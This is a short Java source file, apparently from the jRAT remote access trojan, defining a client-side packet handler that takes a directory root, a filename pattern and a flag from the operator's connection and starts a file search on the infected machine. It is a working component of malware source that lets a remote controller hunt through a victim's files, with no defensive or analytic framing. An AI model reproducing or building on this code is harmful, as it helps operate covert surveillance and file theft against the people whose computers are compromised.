package jrat.client.packets.incoming;

import jrat.client.Connection;
import jrat.client.FileSearch;

import java.io.File;


public class Packet53StartSearch extends AbstractIncomingPacket {

	@Override
	public void read(Connection con) throws Exception {
		String searchRoot = con.readLine();

		if (!searchRoot.endsWith(File.separator)) {
			searchRoot += File.separator;
		}

		String pattern = con.readLine();
		boolean searchPath = con.readBoolean();
		new FileSearch(con, searchRoot, pattern, searchPath).start();
	}

}
